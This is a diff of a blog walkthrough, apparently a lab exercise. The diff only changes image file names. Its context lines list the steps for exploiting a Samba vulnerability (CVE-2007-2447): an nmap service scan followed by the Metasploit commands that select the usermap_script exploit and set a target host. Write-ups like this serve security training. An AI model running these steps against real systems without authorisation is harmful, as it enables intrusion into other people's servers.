@@ -4,7 +4,7 @@ In this blog, we explore the process of identifying and exploiting vulnerabiliti
 
 Perform an `nmap` scan using the `-sV` switch. We see we get a response with multiple services up and running on the target server.
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we do some basic research, we identify some vulnerabilities relating to the Samba version running on the server.
 
@@ -18,11 +18,11 @@ Type the following commands to properly execute the Metasploit payload:
 
 `search cve-2007-2447`
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Find Metasploit script</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption><p>Find Metasploit script</p></figcaption></figure>
 
 `use exploit/multi/samba/usermap_script`
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Use script</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>Use script</p></figcaption></figure>
 
 `set rhost "Enter applicable ip address"`
 
